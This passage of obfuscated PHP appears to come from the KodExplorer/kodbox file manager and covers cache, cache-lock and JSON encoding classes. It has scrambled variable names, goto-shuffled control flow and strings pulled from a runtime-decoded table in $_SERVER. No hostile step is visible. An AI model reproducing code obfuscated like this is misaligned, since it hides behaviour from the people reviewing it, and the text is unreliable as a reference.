static function init() { goto a²¬œ“ ‡; fîô£ÜÊÄ™: $eôÅĞá„ = $GLOBALS[$E›Æ‚—´Ç¶[6]][$E›Æ‚—´Ç¶[334]]; $C¬àáÔÄÄ£ = $eôÅĞá„[$eôÅĞá„[$E›Æ‚—´Ç¶[749]]]; $AÍš„Ó…À = $eôÅĞá„[$E›Æ‚—´Ç¶[750]]; goto DÑĞ ‡¸¤„; DÑĞ ‡¸¤„: switch ($eôÅĞá„[$E›Æ‚—´Ç¶[749]]) { case $E›Æ‚—´Ç¶[17]: self::$handle = Model($E›Æ‚—´Ç¶[751]); break; case $E›Æ‚—´Ç¶[752]: self::$handle = new CacheRedis($C¬àáÔÄÄ£, $AÍš„Ó…À); break; case $E›Æ‚—´Ç¶[753]: self::$handle = new CacheMemcached($C¬àáÔÄÄ£, $AÍš„Ó…À); break; case $E›Æ‚—´Ç¶[164]: self::$handle = new CacheFile($C¬àáÔÄÄ£, $AÍš„Ó…À); break; default: break; } return self::$handle; goto aª—ÜàÆØÚ; a²¬œ“ ‡: $E›Æ‚—´Ç¶ =& $_SERVER[÷ÖêïÔÔÓ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fîô£ÜÊÄ™; aª—ÜàÆØÚ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($BÎÓç·ÕœÛ) { if (is_array($BÎÓç·ÕœÛ) || is_object($BÎÓç·ÕœÛ)) { $BÎÓç·ÕœÛ = json_encode($BÎÓç·ÕœÛ); } $BÎÓç·ÕœÛ = rawurlencode($BÎÓç·ÕœÛ); return KOD_SITE_ID . $_SERVER[÷ÖêïÔÔÓ][71] . $BÎÓç·ÕœÛ; } public static function get($c´ÚŒ‚Í‘×) { $bÀ‘Ïªô¯â = self::key($c´ÚŒ‚Í‘×); if (!isset(self::$memoryCache[$bÀ‘Ïªô¯â])) { CacheLock::lock($c´ÚŒ‚Í‘×); $aâËà¹ŞÈÀ = self::init()->get($bÀ‘Ïªô¯â); CacheLock::unlock($c´ÚŒ‚Í‘×); self::$memoryCache[$bÀ‘Ïªô¯â] = unserialize($aâËà¹ŞÈÀ); } return self::$memoryCache[$bÀ‘Ïªô¯â]; } public static function set($Fãé¼ëì˜å, $d¢ß§§á³Ò, $fïÅß† £ = false) { goto CÆƒ«ÛïİÛ; d¿ˆÃÅËˆÒ: CacheLock::lock($Fãé¼ëì˜å); $aª¿¹ƒˆÃ = self::init()->set($bµ®ô‰‹ƒš, serialize($d¢ß§§á³Ò), $fïÅß† £); self::$memoryCache[$bµ®ô‰‹ƒš] = $d¢ß§§á³Ò; goto C£¯ô½ÛíÚ; C£¯ô½ÛíÚ: CacheLock::unlock($Fãé¼ëì˜å); return $aª¿¹ƒˆÃ; goto fîÁ‘ˆ¸Ã‹; CÆƒ«ÛïİÛ: $bµ®ô‰‹ƒš = self::key($Fãé¼ëì˜å); if (isset(self::$memoryCache[$bµ®ô‰‹ƒš]) && self::$memoryCache[$bµ®ô‰‹ƒš] === $d¢ß§§á³Ò) { return !0; } if ($fïÅß† £ === 0) { self::$memoryCache[$bµ®ô‰‹ƒš] = $d¢ß§§á³Ò; return !0; } goto d¿ˆÃÅËˆÒ; fîÁ‘ˆ¸Ã‹: } public static function remove($c¡ŸçÂ§Å‹) { goto dáËàë ì¿; AÎ¹ÕìÄåÃ: return $B¿àïƒÏˆ; goto c‰·ÒÃºÌ¨; dáËàë ì¿: $Bù»ÃµáÙ— = self::key($c¡ŸçÂ§Å‹); unset(self::$memoryCache[$Bù»ÃµáÙ—]); self::clearTimeout(); goto F©é‰Òºß; F©é‰Òºß: CacheLock::lock($c¡ŸçÂ§Å‹); $B¿àïƒÏˆ = self::init()->remove($Bù»ÃµáÙ—); CacheLock::unlock($c¡ŸçÂ§Å‹); goto AÎ¹ÕìÄåÃ; c‰·ÒÃºÌ¨: } public static function clearMemory($c¦óÏ‹¿’î = false) { if ($c¦óÏ‹¿’î) { $c¦óÏ‹¿’î = self::key($c¦óÏ‹¿’î); unset(self::$memoryCache[$c¦óÏ‹¿’î]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[÷ÖêïÔÔÓ][754])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[÷ÖêïÔÔÓ][755])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fà–×„œÜ‡, $A‘´ïÃª‘) { $c¨°ÖÊìó­ =& $_SERVER[÷ÖêïÔÔÓ]; $this->cachePath = $fà–×„œÜ‡[$c¨°ÖÊìó­[76]]; $this->prefix = $c¨°ÖÊìó­[756]; $this->cacheTime = $A‘´ïÃª‘; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($A“¸œÛ÷šà) { $D’ì‹‘˜¯§ =& $_SERVER[÷ÖêïÔÔÓ]; $A“¸œÛ÷šà = str_replace(array($D’ì‹‘˜¯§[724], $D’ì‹‘˜¯§[94], $D’ì‹‘˜¯§[70]), $D’ì‹‘˜¯§[757], $A“¸œÛ÷šà); return $this->cachePath . $D’ì‹‘˜¯§[758] . $A“¸œÛ÷šà . $D’ì‹‘˜¯§[759]; } public function set($cÖêÊ–ĞÂĞ, $F„ƒ…ğÏĞ¥, $B¸šÏİÅã = false) { $aîØó«Õé = $this->getFile($cÖêÊ–ĞÂĞ); if (file_put_contents($aîØó«Õé, $this->prefix . $F„ƒ…ğÏĞ¥, LOCK_EX)) { return !0; } @unlink($aîØó«Õé); return !1; } public function get($bÁÆÊÔ’·ò) { $b§µ”“î¹° = $this->getFile($bÁÆÊÔ’·ò); if (file_exists($b§µ”“î¹°) && filemtime($b§µ”“î¹°) < time() - $this->cacheTime) { @unlink($b§µ”“î¹°); return !1; } $FİŒ˜«¸ÏÕ = @file_get_contents($b§µ”“î¹°); return substr($FİŒ˜«¸ÏÕ, strlen($this->prefix)); } public function remove($a¶óóß´ÚÄ) { $f¡¶ˆà®êó = $this->getFile($a¶óóß´ÚÄ); return @unlink($f¡¶ˆà®êó); } public function deleteAll() { $båˆ†¿åñà =& $_SERVER[÷ÖêïÔÔÓ]; $C¹ö—ñíÙ× = scandir($this->cachePath); foreach ($C¹ö—ñíÙ× as $D’½’×Çğ) { $e‚ç‡ÅŞÃ» = $this->cachePath . $D’½’×Çğ; if (strpos($e‚ç‡ÅŞÃ», $båˆ†¿åñà[759]) && strpos($e‚ç‡ÅŞÃ», $båˆ†¿åñà[760])) { @unlink($e‚ç‡ÅŞÃ»); } } } public function clearTimeout() { $b‘Æ„øµÚ =& $_SERVER[÷ÖêïÔÔÓ]; $c®œˆÏ­«Ê = scandir($this->cachePath); foreach ($c®œˆÏ­«Ê as $AÁæÙÚ‡ôÅ) { $EØ‘§–ŞÙË = $this->cachePath . $AÁæÙÚ‡ôÅ; if (strpos($EØ‘§–ŞÙË, $b‘Æ„øµÚ[759]) && strpos($EØ‘§–ŞÙË, $b‘Æ„øµÚ[760]) && filemtime($EØ‘§–ŞÙË) < time() - $this->cacheTime) { @unlink($EØ‘§–ŞÙË); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto f†‡Ò‰ÇÓÔ; f†‡Ò‰ÇÓÔ: $FÔôò¦ß³— =& $_SERVER[÷ÖêïÔÔÓ]; if (self::$handle) { return self::$handle; } $F„óÒäàÆŒ = $GLOBALS[$FÔôò¦ß³—[6]][$FÔôò¦ß³—[334]]; goto Aâ„à£ù­š; Aâ„à£ù­š: self::$timeout = $F„óÒäàÆŒ[$FÔôò¦ß³—[761]] ? $F„óÒäàÆŒ[$FÔôò¦ß³—[761]] : 10; $C¸ ñÒæ½ = _get($GLOBALS[$FÔôò¦ß³—[6]], $FÔôò¦ß³—[762]); if ($F„óÒäàÆŒ[$FÔôò¦ß³—[749]] == $FÔôò¦ß³—[17] && $C¸ ñÒæ½ == $FÔôò¦ß³—[9]) { $F„óÒäàÆŒ[$FÔôò¦ß³—[749]] = $FÔôò¦ß³—[164]; } goto bñ³ÆŞÜ£ù; bñ³ÆŞÜ£ù: switch ($F„óÒäàÆŒ[$FÔôò¦ß³—[749]]) { case $FÔôò¦ß³—[752]: self::$handle = new CacheLockRedis(); break; case $FÔôò¦ß³—[753]: self::$handle = new CacheLockMemcached(); break; case $FÔôò¦ß³—[17]: self::$handle = new CacheLockDatabase(); break; case $FÔôò¦ß³—[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto Bê’‡İ¥Ø; Bê’‡İ¥Ø: } private static function key($cöÅÜÒÛÉ½) { return $_SERVER[÷ÖêïÔÔÓ][763] . Cache::key($cöÅÜÒÛÉ½); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AôÃ«‘¾¡İ = '') { self::$errorMsg = $AôÃ«‘¾¡İ; } public static function lockGlobal($eöõÀÓÑĞó, $F²ƒÀĞ•‘Ü) { return self::lock($eöõÀÓÑĞó, $F²ƒÀĞ•‘Ü, !0); } public static function lock($Eªë´Å‹½, $f¤¨±„²•‚ = false, $B†Ø¬š¨¢ = false) { goto E·‚ùãïÆ; Aéİ…ÓàÔ‚: $f¤¨±„²•‚ = $f¤¨±„²•‚ ? $f¤¨±„²•‚ : self::$timeout; $f”æñĞÆ = $a´ö­‡§¾->lock($F±â‚á›ê£, $f¤¨±„²•‚); if (!$f”æñĞÆ) { $B¤çÌÌæòÈ = $cã¼¾‘‘¥î[764] . $f¤¨±„²•‚ . $cã¼¾‘‘¥î[68] . self::$errorMsg . $cã¼¾‘‘¥î[68] . get_caller_msg(); $eÀ«¥ˆŠ• = "\114\157\143\153\40\141\143\164\151\157\x6e\x3a\x20{$F±â‚á›ê£}\40\164\151\155\x65\157\x75\x74\54\157\166\x65\x72\40{$f¤¨±„²•‚}\40\163"; $eÀ«¥ˆŠ• = self::$errorMsg ? self::$errorMsg : $a¢Œ ¥â×ç; write_log($B¤çÌÌæòÈ, $cã¼¾‘‘¥î[765]); show_json($eÀ«¥ˆŠ•, !1); } goto A®•„±»†; E·‚ùãïÆ: $cã¼¾‘‘¥î =& $_SERVER[÷ÖêïÔÔÓ]; $a´ö­‡§¾ = self::init(); $F±â‚á›ê£ = self::key($Eªë´Å‹½); goto Aéİ…ÓàÔ‚; A®•„±»†: if (!$B†Ø¬š¨¢) { self::$lockItem[$F±â‚á›ê£] = !0; } return $f”æñĞÆ; goto cÒĞš¯¶¦Î; cÒĞš¯¶¦Î: } public static function lockGet($b¸Ôóİ–Ã) { $FÓ³Ÿ™¡Ø‘ = self::key($b¸Ôóİ–Ã); if (self::$lockItem[$FÓ³Ÿ™¡Ø‘]) { return self::$lockItem[$FÓ³Ÿ™¡Ø‘]; } return self::init()->lockGet($FÓ³Ÿ™¡Ø‘); } public static function unlock($fˆÇ™„¡çƒ) { $c©®òÈôíƒ = self::key($fˆÇ™„¡çƒ); self::$lockItem[$c©®òÈôíƒ] = null; return self::init()->unlock($c©®òÈôíƒ); } public static function unlockRuntime() { $BŠ£âà‰ =& $_SERVER[÷ÖêïÔÔÓ]; $c÷’±÷‡ì  = self::init(); $EØ‰¾È‡¬ = !1; foreach (self::$lockItem as $d—ë‚ÊÏ‚ => $a¼¼‹¬ö¼) { if (!$a¼¼‹¬ö¼) { continue; } $c÷’±÷‡ì ->unlock($d—ë‚ÊÏ‚); if (!$EØ‰¾È‡¬) { $EØ‰¾È‡¬ = !0; write_log($BŠ£âà‰[766] . $d—ë‚ÊÏ‚ . $BŠ£âà‰[68] . get_caller_msg(), $BŠ£âà‰[765]); continue; } write_log($BŠ£âà‰[766] . $d—ë‚ÊÏ‚, $BŠ£âà‰[765]); } } } goto e…§Úñ£Í; AÎñçƒ¬­: function beforeShutdownFatalError($c©ŒâÚÀØ—) { think_exception($c©ŒâÚÀØ—); } $_SERVER[$_SERVER[Óº‹‘Î][47]] = $FÔ®˜†Ó‘Ó($_SERVER[$_SERVER[Óº‹‘Î][44]]); $B×…Â‹ôëß = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto c”Ñ¥¼±Š„; B©Û‹êŠõŞ: define($_SERVER[÷ÖêïÔÔÓ][224], 2); define($_SERVER[÷ÖêïÔÔÓ][225], 3); define($_SERVER[÷ÖêïÔÔÓ][226], 1); goto DÔÓèìø¹¦; e»øÊ¨Ñ‚Ÿ: define($_SERVER[÷ÖêïÔÔÓ][1839], 32); class Services_JSON { function __construct($dªÓåºÑÜ‰ = 0) { $this->use = $dªÓåºÑÜ‰; } function utf162utf8($EÂ‘¢‚Îˆ) { $b¥–Şè÷›Ÿ =& $_SERVER[÷ÖêïÔÔÓ]; if (function_exists($b¥–Şè÷›Ÿ[69])) { return mb_convert_encoding($EÂ‘¢‚Îˆ, $b¥–Şè÷›Ÿ[1489], $b¥–Şè÷›Ÿ[1840]); } $D’Ï‰‹¯×— = ord($EÂ‘¢‚Îˆ[0]) << 8 | ord($EÂ‘¢‚Îˆ[1]); switch (!0) { case (127 & $D’Ï‰‹¯×—) == $D’Ï‰‹¯×—: return chr(127 & $D’Ï‰‹¯×—); case (2047 & $D’Ï‰‹¯×—) == $D’Ï‰‹¯×—: return chr(192 | $D’Ï‰‹¯×— >> 6 & 31) . chr(128 | $D’Ï‰‹¯×— & 63); case (65535 & $D’Ï‰‹¯×—) == $D’Ï‰‹¯×—: return chr(224 | $D’Ï‰‹¯×— >> 12 & 15) . chr(128 | $D’Ï‰‹¯×— >> 6 & 63) . chr(128 | $D’Ï‰‹¯×— & 63); } return $b¥–Şè÷›Ÿ[33]; } function utf82utf16($Cù¤ÃÚ²äÁ) { $A¼Ó¸ï›Ùğ =& $_SERVER[÷ÖêïÔÔÓ]; if (function_exists($A¼Ó¸ï›Ùğ[69])) { return mb_convert_encoding($Cù¤ÃÚ²äÁ, $A¼Ó¸ï›Ùğ[1840], $A¼Ó¸ï›Ùğ[1489]); } switch (strlen($Cù¤ÃÚ²äÁ)) { case 1: return $Cù¤ÃÚ²äÁ; case 2: return chr(7 & ord($Cù¤ÃÚ²äÁ[0]) >> 2) . chr(192 & ord($Cù¤ÃÚ²äÁ[0]) << 6 | 63 & ord($Cù¤ÃÚ²äÁ[1])); case 3: return chr(240 & ord($Cù¤ÃÚ²äÁ[0]) << 4 | 15 & ord($Cù¤ÃÚ²äÁ[1]) >> 2) . chr(192 & ord($Cù¤ÃÚ²äÁ[1]) << 6 | 127 & ord($Cù¤ÃÚ²äÁ[2])); } return $A¼Ó¸ï›Ùğ[33]; } function encode($BÒœ£ÎéÊ³) { $f²³é½¥â =& $_SERVER[÷ÖêïÔÔÓ]; switch (gettype($BÒœ£ÎéÊ³)) { case $f²³é½¥â[1500]: return $BÒœ£ÎéÊ³ ? $f²³é½¥â[1499] : $f²³é½¥â[1501]; case $f²³é½¥â[1841]: return $f²³é½¥â[100]; case $f²³é½¥â[300]: return (int) $BÒœ£ÎéÊ³; case $f²³é½¥â[275]: case $f²³é½¥â[274]: return (double) $BÒœ£ÎéÊ³; case $f²³é½¥â[309]: $aË»£‰œ®Ã = $f²³é½¥â[33]; $aÌøÛˆ˜¢ = strlen($BÒœ£ÎéÊ³); for ($cĞèÍİÒ‘Ÿ = 0; $cĞèÍİÒ‘Ÿ < $aÌøÛˆ˜¢; ++$cĞèÍİÒ‘Ÿ) { $BÀË…ÀĞª = ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ]); switch (!0) { case $BÀË…ÀĞª == 8: $aË»£‰œ®Ã .= $f²³é½¥â[1842]; break; case $BÀË…ÀĞª == 9: $aË»£‰œ®Ã .= $f²³é½¥â[1476]; break; case $BÀË…ÀĞª == 10: $aË»£‰œ®Ã .= $f²³é½¥â[1474]; break; case $BÀË…ÀĞª == 12: $aË»£‰œ®Ã .= $f²³é½¥â[1843]; break; case $BÀË…ÀĞª == 13: $aË»£‰œ®Ã .= $f²³é½¥â[1475]; break; case $BÀË…ÀĞª == 34: case $BÀË…ÀĞª == 47: case $BÀË…ÀĞª == 92: $aË»£‰œ®Ã .= $f²³é½¥â[94] . $BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ]; break; case $BÀË…ÀĞª >= 32 && $BÀË…ÀĞª <= 127: $aË»£‰œ®Ã .= $BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ]; break; case ($BÀË…ÀĞª & 224) == 192: $DøÈŠº«ª = pack($f²³é½¥â[1844], $BÀË…ÀĞª, ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 1])); $cĞèÍİÒ‘Ÿ += 1; $C²³ì«âÀÇ = $this->utf82utf16($DøÈŠº«ª); $aË»£‰œ®Ã .= sprintf($f²³é½¥â[1845], bin2hex($C²³ì«âÀÇ)); break; case ($BÀË…ÀĞª & 240) == 224: $DøÈŠº«ª = pack($f²³é½¥â[1844], $BÀË…ÀĞª, ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 1]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 2])); $cĞèÍİÒ‘Ÿ += 2; $C²³ì«âÀÇ = $this->utf82utf16($DøÈŠº«ª); $aË»£‰œ®Ã .= sprintf($f²³é½¥â[1845], bin2hex($C²³ì«âÀÇ)); break; case ($BÀË…ÀĞª & 248) == 240: $DøÈŠº«ª = pack($f²³é½¥â[1844], $BÀË…ÀĞª, ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 1]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 2]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 3])); $cĞèÍİÒ‘Ÿ += 3; $C²³ì«âÀÇ = $this->utf82utf16($DøÈŠº«ª); $aË»£‰œ®Ã .= sprintf($f²³é½¥â[1845], bin2hex($C²³ì«âÀÇ)); break; case ($BÀË…ÀĞª & 252) == 248: $DøÈŠº«ª = pack($f²³é½¥â[1844], $BÀË…ÀĞª, ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 1]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 2]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 3]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 4])); $cĞèÍİÒ‘Ÿ += 4; $C²³ì«âÀÇ = $this->utf82utf16($DøÈŠº«ª); $aË»£‰œ®Ã .= sprintf($f²³é½¥â[1845], bin2hex($C²³ì«âÀÇ)); break; case ($BÀË…ÀĞª & 254) == 252: $DøÈŠº«ª = pack($f²³é½¥â[1844], $BÀË…ÀĞª, ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 1]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 2]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 3]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 4]), ord($BÒœ£ÎéÊ³[$cĞèÍİÒ‘Ÿ + 5])); $cĞèÍİÒ‘Ÿ += 5; $C²³ì«âÀÇ = $this->utf82utf16($DøÈŠº«ª); $aË»£‰œ®Ã .= sprintf($f²³é½¥â[1845], bin2hex($C²³ì«âÀÇ)); break; } } return $f²³é½¥â[112] . $aË»£‰œ®Ã . $f²³é½¥â[112]; case $f²³é½¥â[1846]: if (is_array($BÒœ£ÎéÊ³) && count($BÒœ£ÎéÊ³) && array_keys($BÒœ£ÎéÊ³) !== range(0, sizeof($BÒœ£ÎéÊ³) - 1)) { $f—Ò¦œ  = array_map(array($this, $f²³é½¥â[1847]), array_keys($BÒœ£ÎéÊ³), array_values($BÒœ£ÎéÊ³)); foreach ($f—Ò¦œ  as $dºÛ…À–Ğ£) { if (Services_JSON::isError($dºÛ…À–Ğ£)) { return $dºÛ…À–Ğ£; } } return $f²³é½¥â[1039] . join($f²³é½¥â[47], $f—Ò¦œ ) . $f²³é½¥â[312]; } $E¦Ç‡’œ = array_map(array($this, $f²³é½¥â[1848]), $BÒœ£ÎéÊ³); foreach ($E¦Ç‡’œ as $e…ƒ©¢³ô¸) { if (Services_JSON::isError($e…ƒ©¢³ô¸)) { return $e…ƒ©¢³ô¸; } } return $f²³é½¥â[154] . join($f²³é½¥â[47], $E¦Ç‡’œ) . $f²³é½¥â[468]; case $f²³é½¥â[1849]: $eãšœ‰•  = get_object_vars($BÒœ£ÎéÊ³); $f—Ò¦œ  = array_map(array($this, $f²³é½¥â[1847]), array_keys($eãšœ‰• ), array_values($eãšœ‰• )); foreach ($f—Ò¦œ  as $dºÛ…À–Ğ£) { if (Services_JSON::isError($dºÛ…À–Ğ£)) { return $dºÛ…À–Ğ£; } } return $f²³é½¥â[1039] . join($f²³é½¥â[47], $f—Ò¦œ ) . $f²³é½¥â[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $f²³é½¥â[100] : new Services_JSON_Error(gettype($BÒœ£ÎéÊ³) . $f²³é½¥â[1850]); } } function name_value($d»Ÿ…øöÊ, $fÉÚèƒ‹×) { $AÃ–ˆó†´½ = $this->encode($fÉÚèƒ‹×); if (Services_JSON::isError($AÃ–ˆó†´½)) { return $AÃ–ˆó†´½; } return $this->encode(strval($d»Ÿ…øöÊ)) . $_SERVER[÷ÖêïÔÔÓ][4] . $AÃ–ˆó†´½; } function reduce_string($E²îÊ’™Áà) { $Eé¨ÁÅ•… =& $_SERVER[÷ÖêïÔÔÓ]; $E²îÊ’™Áà = preg_replace(array($Eé¨ÁÅ•…[1851], $Eé¨ÁÅ•…[1852], $Eé¨ÁÅ•…[1853]), $Eé¨ÁÅ•…[33], $E²îÊ’™Áà); return trim($E²îÊ’™Áà); } function decode($F¨”èƒç) { $Bï¹­ˆÜ =& $_SERVER[÷ÖêïÔÔÓ]; $F¨”èƒç = $this->reduce_string($F¨”èƒç); switch (strtolower($F¨”èƒç)) { case $Bï¹­ˆÜ[1499]: return !0; case $Bï¹­ˆÜ[1501]: return !1; case $Bï¹­ˆÜ[100]: return null; default: $BğÌˆ‡ª“— = array(); if (is_numeric($F¨”èƒç)) { return (double) $F¨”èƒç == (int) $F¨”èƒç ? (int) $F¨”èƒç : (double) $F¨”èƒç; } elseif (preg_match($Bï¹­ˆÜ[1854], $F¨”èƒç, $BğÌˆ‡ª“—) && $BğÌˆ‡ª“—[1] == $BğÌˆ‡ª“—[2]) { $A×Š¹Å“º„ = substr($F¨”èƒç, 0, 1); $fŞ»š™œ¥ = substr($F¨”èƒç, 1, -1); $Aë±¡ê‡Ù = $Bï¹­ˆÜ[33]; $càÇ••å·Š = strlen($fŞ»š™œ¥); for ($Eá›íŠ ïÔ = 0; $Eá›íŠ ïÔ < $càÇ••å·Š; ++$Eá›íŠ ïÔ) { $D¸ğô°°ˆ = substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 2); $E®¥İóğğ = ord($fŞ»š™œ¥[$Eá›íŠ ïÔ]); switch (!0) { case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1842]: $Aë±¡ê‡Ù .= chr(8); ++$Eá›íŠ ïÔ; break; case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1476]: $Aë±¡ê‡Ù .= chr(9); ++$Eá›íŠ ïÔ; break; case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1474]: $Aë±¡ê‡Ù .= chr(10); ++$Eá›íŠ ïÔ; break; case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1843]: $Aë±¡ê‡Ù .= chr(12); ++$Eá›íŠ ïÔ; break; case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1475]: $Aë±¡ê‡Ù .= chr(13); ++$Eá›íŠ ïÔ; break; case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1249]: case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1855]: case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1469]: case $D¸ğô°°ˆ == $Bï¹­ˆÜ[1471]: if ($A×Š¹Å“º„ == $Bï¹­ˆÜ[112] && $D¸ğô°°ˆ != $Bï¹­ˆÜ[1855] || $A×Š¹Å“º„ == $Bï¹­ˆÜ[55] && $D¸ğô°°ˆ != $Bï¹­ˆÜ[1249]) { $Aë±¡ê‡Ù .= $fŞ»š™œ¥[++$Eá›íŠ ïÔ]; } break; case preg_match($Bï¹­ˆÜ[1856], substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 6)): $A ‘—Ù¢¹ = chr(hexdec(substr($fŞ»š™œ¥, $Eá›íŠ ïÔ + 2, 2))) . chr(hexdec(substr($fŞ»š™œ¥, $Eá›íŠ ïÔ + 4, 2))); $Aë±¡ê‡Ù .= $this->utf162utf8($A ‘—Ù¢¹); $Eá›íŠ ïÔ += 5; break; case $E®¥İóğğ >= 32 && $E®¥İóğğ <= 127: $Aë±¡ê‡Ù .= $fŞ»š™œ¥[$Eá›íŠ ïÔ]; break; case ($E®¥İóğğ & 224) == 192: $Aë±¡ê‡Ù .= substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 2); ++$Eá›íŠ ïÔ; break; case ($E®¥İóğğ & 240) == 224: $Aë±¡ê‡Ù .= substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 3); $Eá›íŠ ïÔ += 2; break; case ($E®¥İóğğ & 248) == 240: $Aë±¡ê‡Ù .= substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 4); $Eá›íŠ ïÔ += 3; break; case ($E®¥İóğğ & 252) == 248: $Aë±¡ê‡Ù .= substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 5); $Eá›íŠ ïÔ += 4; break; case ($E®¥İóğğ & 254) == 252: $Aë±¡ê‡Ù .= substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 6); $Eá›íŠ ïÔ += 5; break; } } return $Aë±¡ê‡Ù; } elseif (preg_match($Bï¹­ˆÜ[1857], $F¨”èƒç) || preg_match($Bï¹­ˆÜ[1858], $F¨”èƒç)) { goto BĞù‹ÎÜĞ; c¦Ö‰ö‡®Ø: $fŞ»š™œ¥ = $this->reduce_string($fŞ»š™œ¥); if ($fŞ»š™œ¥ == $Bï¹­ˆÜ[33]) { if (reset($BÒŒä¼Êé–) == SERVICES_JSON_IN_ARR) { return $bµˆö’Õ‡; } else { return $D‡†¢¬ã‰İ; } } $càÇ••å·Š = strlen($fŞ»š™œ¥); goto dÍã‹ùšÇŠ; dÍã‹ùšÇŠ: for ($Eá›íŠ ïÔ = 0; $Eá›íŠ ïÔ <= $càÇ••å·Š; ++$Eá›íŠ ïÔ) { $eç¸Ò˜’ÚË = end($BÒŒä¼Êé–); $D¸ğô°°ˆ = substr($fŞ»š™œ¥, $Eá›íŠ ïÔ, 2); if ($Eá›íŠ ïÔ == $càÇ••å·Š || $fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[47] && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] == SERVICES_JSON_SLICE) { $bš¨ëŒº‘¹ = substr($fŞ»š™œ¥, $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[260]], $Eá›íŠ ïÔ - $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[260]]); array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_SLICE, $Bï¹­ˆÜ[260] => $Eá›íŠ ïÔ + 1, $Bï¹­ˆÜ[1860] => !1)); if (reset($BÒŒä¼Êé–) == SERVICES_JSON_IN_ARR) { array_push($bµˆö’Õ‡, $this->decode($bš¨ëŒº‘¹)); } elseif (reset($BÒŒä¼Êé–) == SERVICES_JSON_IN_OBJ) { $E¨Ó”ÌßŠæ = array(); if (preg_match($Bï¹­ˆÜ[1861], $bš¨ëŒº‘¹, $E¨Ó”ÌßŠæ)) { $fÅÌ¤Õ¤î = $this->decode($E¨Ó”ÌßŠæ[1]); $a™…çÏõ = $this->decode($E¨Ó”ÌßŠæ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D‡†¢¬ã‰İ[$fÅÌ¤Õ¤î] = $a™…çÏõ; } else { $D‡†¢¬ã‰İ->{$fÅÌ¤Õ¤î} = $a™…çÏõ; } } elseif (preg_match($Bï¹­ˆÜ[1862], $bš¨ëŒº‘¹, $E¨Ó”ÌßŠæ)) { $fÅÌ¤Õ¤î = $E¨Ó”ÌßŠæ[1]; $a™…çÏõ = $this->decode($E¨Ó”ÌßŠæ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $D‡†¢¬ã‰İ[$fÅÌ¤Õ¤î] = $a™…çÏõ; } else { $D‡†¢¬ã‰İ->{$fÅÌ¤Õ¤î} = $a™…çÏõ; } } } } elseif (($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[112] || $fŞ»š™œ¥[$Eá›íŠ ïÔ] == $Bï¹­ˆÜ[55]) && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] != SERVICES_JSON_IN_STR) { array_push($BÒŒä¼Êé–, array($Bï¹­ˆÜ[1859] => SERVICES_JSON_IN_STR, $Bï¹­ˆÜ[260] => $Eá›íŠ ïÔ, $Bï¹­ˆÜ[1860] => $fŞ»š™œ¥[$Eá›íŠ ïÔ])); } elseif ($fŞ»š™œ¥[$Eá›íŠ ïÔ] == $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1860]] && $eç¸Ò˜’ÚË[$Bï¹­ˆÜ[1859]] == SERVICES_JSON_IN_STR && (strlen(substr($fŞ»š™œ¥, 0, $Eá›íŠ ïÔ)) - strlen(rtrim(substr($fŞ»š™œ¥, 0, $Eá›íŠ ïÔ), $Bï¹­ˆÜ[94]))) % 2 != 